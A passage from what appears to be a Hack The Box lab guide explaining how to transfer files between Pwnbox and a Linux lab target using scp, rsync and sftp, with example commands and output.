tcp_dump_2024-11-22-07:04:48.pcap             100%  683KB 269.6KB/s   00:02

```

This command transfers the `tcp_dump_2024-11-22-07:04:48.pcap` file from the remote directory `/tmp` on the Linux Purple module target to the local directory `/home/htb-ac-871408/data` on Pwnbox.

* * *

#### Using RSYNC (Remote Sync)

`rsync` is an efficient tool for transferring and synchronizing files. It is especially useful for transferring large files or directories and supports resuming interrupted transfers.

##### Transferring Files from Pwnbox to a Linux Purple Module Target

To transfer files or directories using rsync, the following command can be used:

```shell
rsync -avz /path/to/local/file username@<Target_IP>:/path/to/remote/destination

```

An example of the command execution can be seen below:

```shell
rsync -avz /home/htb-ac-871408/data/file.txt [email protected]:/root/data
[email protected]'s password:
sending incremental file list
file1.txt

sent 143 bytes  received 35 bytes  16.95 bytes/sec
total size is 13  speedup is 0.07

```

This command synchronizes the file `file.txt` from the local directory `/home/htb-ac-871408/data` on Pwnbox to the remote directory `/root/data` on the Linux Purple Module target.

##### Transferring Files from a Linux Purpe Module Target to Pwnbox

To retrieve files from a Linux Purple Module target to Pwnbox, the following rsync command can be used:

```shell
rsync -avz username@<Target_IP>:/path/to/remote/file /path/to/local/destination

```

An example of the command execution can be seen below:

```shell
rsync -avz [email protected]:/root/data/file2.txt /home/htb-ac-871408/data
[email protected]'s password:
receiving incremental file list
file2.txt

sent 43 bytes  received 123 bytes  19.53 bytes/sec
total size is 13  speedup is 0.08

```

This command retrieves the `file2.txt` file from the remote directory `/root/data` on the Linux Purple module target to the local directory `/home/htb-ac-871408/data` on Pwnbox.

##### Using SFTP (Secure File Transfer Protocol)

`sftp` provides an interactive interface for secure file transfers and is useful for browsing remote file systems or transferring files when paths are not well-defined.

#### Connecting to a Linux Purple Module Target

To initiate an `SFTP` session with a Linux Purple Module target, the following command can be used:

```shell
sftp username@<Target_IP>

```

An example of the command execution can be seen below:

```shell
sftp [email protected]
[email protected]'s password:
Connected to 10.129.231.23.
sftp>

```

Once connected, the following commands can be used for file transfers:

- Upload a file to the Linux Purple module target:


```shell
put /path/to/local/file /path/to/remote/destination

```

- Download a file from the Linux Purple module target:


```shell
get /path/to/remote/file /path/to/local/destination

```


Examples of command execution can be seen below:

```shell
sftp> put /home/htb-ac-871408/data/file1.txt /root/data/
    Uploading /home/htb-ac-871408/data/file1.txt to /root/data/file1.txt
    file1.txt                                                               100%   13     0.1KB/s   00:00

```

```shell
sftp> get /root/data/target.txt /home/htb-ac-871408/data/
    Fetching /root/data/target.txt to /home/htb-ac-871408/data/target.txt
    target.txt                                                              100%    5     0.0KB/s   00:00

```


